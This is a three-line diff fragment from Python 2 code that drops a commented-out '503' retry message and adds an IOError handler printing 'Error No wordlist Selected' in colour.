-	#	print color.BOLD+color.R+"503 : Error Retry Later Plz !"+color.ENDC
+	except IOError:
+		print color.BOLD+color.Y+"Error No wordlist Selected"+color.ENDC
